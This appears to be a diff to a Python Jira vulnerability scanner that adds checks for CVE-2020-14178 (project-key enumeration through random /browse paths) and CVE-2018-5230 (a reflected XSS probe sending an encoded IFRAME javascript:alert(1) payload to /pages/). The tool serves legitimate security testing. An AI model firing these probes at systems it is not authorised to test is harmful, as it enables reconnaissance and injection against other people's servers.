@@ -10,6 +10,7 @@ from urllib.parse import urlparse
 from config import *
 import argparse
 import urllib3
+import random
 
 
 
@@ -343,8 +344,23 @@ def CVE_2020_36289(base_url):
     else:
         print(f"{GRAY}[-] Not Vulnerable To CVE 2020 36289\n")
 
+def CVE_2020_14178(base_url):
+    r1 = requests.get(f"{base_url}/browse.{random.randint(100,1000)}", verify=verify_ssl)
+    r2 = requests.get(f"{base_url}/browse.{random.randint(100,1000)}", verify=verify_ssl)
+    keyword = "Project Does Not Exist"
+    if keyword in str(r1.content) or keyword in str(r2.content):
+        print(f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2020-14178 : {base_url}/browse.PROJECTKEY\n")
+        response.append(f"[+] [LOW] Vulnerable To CVE-2020-14178 : {base_url}/browse.PROJECTKEY\n")
+    else:
+        print(f"{GRAY}[-] Not Vulnerable To CVE-2020-14178\n")
 
-
+def CVE_2018_5230(base_url):
+    r = requests.get(f"{base_url}/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%281%29%22%3E.vm", verify=verify_ssl)
+    if "alert(1)" in str(r.content):
+        print(f"{RED}[+] {GREEN} [HIGH]{RESET} Vulnerable To CVE-2018-5230 : {base_url}/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%281%29%22%3E.vm\n")
+        response.append(f"[+] [HIGH] Vulnerable To CVE-2018-5230 {base_url}/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%281%29%22%3E.vm\n")
+    else:
+        print(f"{GRAY}[-] Not Vulnerable To CVE-2018-5230\n")
 
 
 
@@ -565,6 +581,8 @@ def worker(url):
         CVE_2020_36287_helper(base_url)
         CVE_2020_36287_helper_2()
         CVE_2020_36289(base_url)
+        CVE_2020_14178(base_url)
+        CVE_2018_5230(base_url)
         Unauth_User_picker(base_url)
         Unauth_Resolutions(base_url)
         Unauth_Projects(base_url)
